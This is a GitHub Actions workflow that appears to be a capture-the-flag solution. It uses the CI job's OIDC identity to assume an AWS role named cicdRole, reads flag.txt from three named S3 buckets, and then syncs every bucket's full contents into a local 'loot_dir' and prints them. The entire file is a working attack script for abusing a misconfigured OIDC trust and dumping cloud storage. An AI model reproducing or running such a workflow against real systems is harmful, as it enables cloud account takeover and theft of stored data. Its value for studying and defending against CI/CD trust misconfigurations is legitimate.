name: Challenge Auth
on: [push]

jobs:
  auth-job:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: List Resources
        run: |
          echo "=== Trying to read flag from all buckets ==="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - || true
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || true
          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || true
          
          echo "=== Backing up buckets to find the flag file ==="
          mkdir loot_dir
          aws s3 sync s3://platform-bucket-009661764077-us-east-1/ ./loot_dir/ || true
          aws s3 sync s3://codec4f26c862a321ef5/ ./loot_dir/ || true
          aws s3 sync s3://site781fe43f26b9eba3/ ./loot_dir/ || true
          
          echo "=== Contents of local loot directory ==="
          ls -la ./loot_dir || true
          cat ./loot_dir/flag.txt || true
